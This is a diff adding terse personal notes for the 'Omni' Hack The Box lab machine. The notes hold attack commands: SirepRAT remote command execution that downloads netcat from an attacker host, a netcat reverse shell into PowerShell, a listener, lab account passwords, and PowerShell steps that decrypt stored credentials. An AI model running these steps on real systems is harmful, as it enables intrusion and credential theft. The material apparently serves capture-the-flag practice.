@@ -47,3 +47,41 @@ https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-14
 
 Doctor
 https://www.youtube.com/watch?v=2BvuoWG_r9Y
+
+
+
+Omni Commands
+
+python3 -m http.server 80
+
+https://github.com/SafeBreach-Labs/SirepRAT
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-WebRequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.2/nc64.exe" --v   
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.2 1234 -e powershell.exe" --v  
+
+
+
+cd WindowsPowershell\Modules\PackageManagement
+
+
+type r.bat
+
+
+net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz
+
+
+ nc -nlvp 1236
+
+C:\Windows\System32\spooldrivers\color\nc64.exe 10.10.14.2 1235 -e powershell.exe
+
+$credential = Import-CliXml -Path U:\Users\app\user.txt 
+
+ $credential = Import-CliXml -Path U:\Users\administrator\root.txt
+
+$credential.GetNetworkCredential().Password
+
+
+
+
